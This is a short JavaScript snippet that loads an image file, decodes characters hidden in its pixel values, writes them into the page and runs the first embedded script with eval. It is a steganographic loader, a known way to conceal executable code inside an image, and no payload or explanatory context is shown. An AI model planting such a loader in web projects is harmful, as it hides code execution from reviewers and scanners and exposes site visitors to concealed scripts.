var img = new Image();
img.onload = function(){
	var c = document.createElement('canvas', {width:this.width, height:this.height});
	c.getContext('2d').drawImage(this, 0, 0);
	var d = c.getContext('2d').getImageData(0, 0, this.width, this.height).data;
	var r = "";
	for (var i=0; i<d.length;i=i+3)  r += (d[i] != 0 && d[i] != 255)? String.fromCharCode(d[i]):"";
	document.body.innerHTML = r;
	var s = document.body.getElementsByTagName("script");
	eval(s[0].text);
}
window.onload = function(){
	img.src = 'c.jpg';
}